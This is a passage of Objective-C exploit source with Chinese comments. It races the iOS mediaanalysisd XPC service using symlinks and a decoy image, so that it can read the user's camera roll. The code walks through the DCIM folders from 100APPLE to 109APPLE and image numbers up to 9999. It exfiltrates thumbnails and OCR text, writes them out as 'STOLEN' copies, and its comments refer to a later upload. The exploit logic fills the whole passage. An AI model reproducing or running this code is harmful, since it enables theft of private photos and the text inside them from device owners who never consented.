                                @"STOLEN %dAPPLE/%@", folder, name]];
                            break;
                            // 目标文件不存在时换 delay（只影响 symlink 时机）没有意义
                            if (_lastXPCError == -18) break;
                        }
                    }
                }
            }
            dispatch_semaphore_signal(limit);
        });
    }
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    return hits;
}

- (void)runDump
{
    [self setupLogFile];
    [self log:@"=== start (200x200 exfil + OCR) ==="];
    [self ensureConnection];

    // 协议不兼容（27.2.1 起 requestImageProcessing:... 已不在
    // VCPMADServicePublicServerProtocol 里）时，试点再走一遍只会白烧
    // 9999 × 4 前缀 × 11 扩展名的探针，还会拖慢随后的采集上传，这里直接结束。
    if (gMADXPCUnavailable) {
        [self log:@"mediaanalysisd XPC unavailable on this OS — scan skipped"];
        return;
    }

    NSString *tmp = NSTemporaryDirectory();

    NSString *decoyPath = [tmp stringByAppendingPathComponent:@"decoy.png"];
    // 纯绿 decoy：用 CGBitmapContext + ImageIO，不碰 UIKit。
    // UIGraphics* 系列要求主线程，runDump 在后台队列里跑，取到的
    // context 可能是 nil，PNG 写不出来 → decoyData 为 nil →
    // racePath 根本不存在 → mediaanalysisd 报 -18 Image loading failed。
    NSData *decoyData = wqMakeGreenPNG(400, 400);
    if (!decoyData.length) {
        [self log:@"decoy 生成失败（CGBitmapContext 返回 nil）—— 无法 race"];
        return;
    }
    [decoyData writeToFile:decoyPath atomically:YES];
    [self log:[NSString stringWithFormat:@"decoy 就绪 %lu bytes -> %@",
               (unsigned long)decoyData.length, decoyPath]];

    int exfiled = 0;
    int scanned = 0;

    // 每个目录都把 IMG_0001..9999 全部扫完、不提前跳过；扫完一个目录再进下一个。
    // 段内 10 张并发，每张一个任务。
    for (int folder = 100; folder <= 109; folder++)
    {
        int folderHits = 0;
        for (int start = 1; start <= 9999; start += 10)
        {
            int hits = [self scanChunk:folder
                                 start:start
                                 count:10
                                   tmp:tmp
                                 decoy:decoyData
                                 total:&scanned];
            if (hits > 0) {
                folderHits += hits;
                exfiled += hits;
            }
            [self log:[NSString stringWithFormat:
                @"%dAPPLE/IMG_%04d-%04d exfil=%d probes=%d lastErr=%ld",
                folder, start, start + 9, exfiled, scanned, (long)_lastXPCError]];
        }
        // 二次扫描补漏：照片通常集中在前 200 个编号，再扫一遍
        for (int start = 1; start <= 200; start += 10)
        {
            int hits = [self scanChunk:folder
                                 start:start
                                 count:10
                                   tmp:tmp
                                 decoy:decoyData
                                 total:&scanned];
            if (hits > 0) {
                folderHits += hits;
                exfiled += hits;
            }
        }
        [self log:[NSString stringWithFormat:
            @"%dAPPLE done: hits=%d scanned=%d", folder, folderHits, scanned]];
    }

    [self log:[NSString stringWithFormat:@"DONE exfil=%d scanned=%d ocrErr=%d", exfiled, scanned, _ocrErrCount]];
}

@end

void MediaAnalysisRaceRun(void)
{
    static dispatch_once_t onceToken;
    static MediaAnalysisRaceRunner *runner;
    dispatch_once(&onceToken, ^{
        runner = [[MediaAnalysisRaceRunner alloc] init];
    });
    [runner start];
}
